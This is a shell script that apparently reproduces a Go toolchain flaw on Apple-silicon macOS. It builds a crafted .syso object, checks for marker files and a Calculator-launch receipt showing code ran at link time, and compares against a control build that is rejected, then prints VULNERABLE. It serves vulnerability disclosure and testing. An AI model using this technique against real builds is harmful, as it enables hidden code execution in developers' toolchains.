#!/bin/sh
set -u

root=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
keep_tmp=${KEEP_TMP:-0}
result=1

if [ "$(uname -s)" != Darwin ] || [ "$(uname -m)" != arm64 ]; then
	printf 'FAIL: this visual demo requires an Apple-silicon Mac\n' >&2
	exit 1
fi
if ! command -v go >/dev/null 2>&1; then
	printf 'FAIL: go is not on PATH\n' >&2
	exit 1
fi
if ! command -v xcrun >/dev/null 2>&1; then
	printf 'FAIL: Apple Command Line Tools are not installed\n' >&2
	exit 1
fi

tmp_base=${TMPDIR:-/tmp}
tmp_base=${tmp_base%/}
run=$(mktemp -d "$tmp_base/go-syso-macos-poc.XXXXXX")
cleanup() {
	if [ "$keep_tmp" = 1 ] || [ "$result" != 0 ]; then
		printf 'retained=%s\n' "$run"
	else
		rm -r -- "$run"
	fi
}
trap cleanup EXIT

clang=$(xcrun --find clang)
sdkroot=$(xcrun --show-sdk-path)
printf 'Preparing pinned Go toolchain...\n'
actual_go=$(
	cd "$root" &&
		GOENV=off GOTOOLCHAIN=auto go env GOVERSION \
			2>"$run/toolchain.stderr"
)
if [ "$actual_go" != go1.27.3 ]; then
	cat "$run/toolchain.stderr" >&2
	printf 'FAIL: expected go1.27.3, got %s\n' "$actual_go" >&2
	exit 1
fi

positive_marker="$run/positive.marker"
control_marker="$run/control.marker"
receipt="$run/calculator.log"
target="$run/target"

printf 'Running crafted .syso build...\n'
set +e
(
	cd "$root" &&
		GO_CGO_MACOS_CALC_MARKER="$positive_marker" \
		GO_CGO_MACOS_CALC_RECEIPT="$receipt" \
		GO_CGO_MACOS_CALC_LOCK_DIR="$run" \
		CC="$clang" SDKROOT="$sdkroot" \
		CGO_ENABLED=0 GOENV=off GOTOOLCHAIN=auto \
		go build -a -buildvcs=false -x -work -ldflags=-v \
			-o "$target" . \
			>"$run/positive.stdout" 2>"$run/positive.stderr"
)
positive_status=$?

printf 'Running identical source-level control...\n'
(
	cd "$root" &&
		GO_CGO_MACOS_CALC_MARKER="$control_marker" \
		GO_CGO_MACOS_CALC_RECEIPT="$run/control-calculator.log" \
		GO_CGO_MACOS_CALC_LOCK_DIR="$run" \
		CC="$clang" SDKROOT="$sdkroot" \
		CGO_ENABLED=1 GOENV=off GOTOOLCHAIN=auto \
		go build -a -buildvcs=false -x \
			-o "$run/control-target" ./control \
			>"$run/control.stdout" 2>"$run/control.stderr"
)
control_status=$?
set -e

positive_marker_value=no
positive_target_value=no
calculator_receipt_value=no
control_rejected_value=no
control_marker_value=no

[ -f "$positive_marker" ] && positive_marker_value=yes
[ -e "$target" ] && positive_target_value=yes
if [ -f "$receipt" ] && grep -q 'event=launch-success' "$receipt"; then
	calculator_receipt_value=yes
fi
if grep -q 'invalid flag in #cgo LDFLAGS' "$run/control.stderr"; then
	control_rejected_value=yes
fi
[ -f "$control_marker" ] && control_marker_value=yes

printf '\nmacos=%s\n' "$(sw_vers -productVersion)"
printf 'machine=%s\n' "$(uname -m)"
printf 'go=%s\n' "$(cd "$root" && GOENV=off GOTOOLCHAIN=auto go version)"
printf 'clang=%s\n' "$("$clang" --version | sed -n '1p')"
printf 'positive_status=%s\n' "$positive_status"
printf 'positive_marker=%s\n' "$positive_marker_value"
printf 'positive_target=%s\n' "$positive_target_value"
printf 'calculator_launch_receipt=%s\n' "$calculator_receipt_value"
printf 'control_status=%s\n' "$control_status"
printf 'control_rejected=%s\n' "$control_rejected_value"
printf 'control_marker=%s\n' "$control_marker_value"

if [ "$positive_marker_value" = yes ] && \
	[ "$positive_target_value" = no ] && \
	[ "$control_rejected_value" = yes ] && \
	[ "$control_marker_value" = no ]; then
	printf 'verdict=VULNERABLE\n'
	result=0
	exit 0
fi

printf 'verdict=NOT_REPRODUCED\n' >&2
printf '\nRelevant linker diagnostics:\n' >&2
grep -E 'host link:|ld:|clang:|classic|lto|error:' \
	"$run/positive.stderr" | tail -40 >&2 || true
exit 1
